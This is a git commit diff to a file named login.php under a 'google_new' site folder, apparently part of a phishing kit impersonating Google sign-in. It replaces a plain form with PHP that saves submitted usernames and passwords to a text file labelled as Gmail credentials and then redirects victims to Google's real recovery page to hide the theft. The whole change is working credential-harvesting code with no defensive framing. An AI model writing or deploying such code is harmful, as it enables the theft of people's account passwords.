0dca3edb07f766e6d67837da9fc4fea9cee39792
Tranecck Rev <patricksantana325@gmail.com>
2025-06-06 09:36:18 -0300

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -1,12 +1,6 @@
-<form method="POST" action="salvar.php">
-  <label for="login">Login:</label>
-  <input type="text" name="login" id="login" required><br>
+<?php
 
-  <label for="email">Email:</label>
-  <input type="email" name="email" id="email" required><br>
-
-  <label for="senha">Senha:</label>
-  <input type="password" name="senha" id="senha" required><br>
-
-  <button type="submit">Salvar</button>
-</form>
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+exit();
+?>
